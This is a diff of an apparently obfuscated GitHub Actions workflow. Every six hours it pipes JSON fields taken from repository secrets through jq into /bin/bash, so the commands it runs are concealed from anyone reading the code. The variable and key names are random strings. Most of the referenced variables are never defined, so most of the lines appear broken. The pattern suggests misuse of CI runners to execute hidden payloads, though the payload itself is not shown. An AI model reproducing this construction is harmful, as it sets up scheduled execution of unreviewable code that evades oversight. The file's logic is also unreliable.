@@ -3,19 +3,27 @@ name: songzhifu1289
 on:
   workflow_dispatch:
   schedule:
-    - cron: '44 5/6 * * *'
-jobs:  # 7697
+    - cron: '54 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: songzhifu1289
         env:
-          lvjn12778: ${{ secrets.lvjn12778 }}
+          xu11: ${{ secrets.xu11 }}
         run: |
-          echo $lvjn12778 | jq -r .ieecp1 | /bin/bash
-          echo $jt82991 | jq -r .lxtuh5 | /bin/bash
-          echo $jcn662 | jq -r .oi6029 | /bin/bash
-          echo $v581 | jq -r .lxyef7476 | /bin/bash
-          echo $cda7 | jq -r .dmrft1468 | /bin/bash
+          echo $xu11 | jq -r .q41478 | /bin/bash
+          echo $sx79 | jq -r .y56664 | /bin/bash
+          echo $ewtvr9 | jq -r .i25405 | /bin/bash
+          echo $voad384 | jq -r .uiqoq114 | /bin/bash
+          echo $x5379 | jq -r .mmtpi9 | /bin/bash
+          echo $uicbd74 | jq -r .lawvr94882 | /bin/bash
+          echo $pofw7 | jq -r .ncmuy9030 | /bin/bash
+          echo $rmog00672 | jq -r .ymqds2651 | /bin/bash
+          echo $q70 | jq -r .m21858 | /bin/bash
+          echo $ap6385 | jq -r .gnrm00451 | /bin/bash
+          echo $o04 | jq -r .oglm4829 | /bin/bash
 
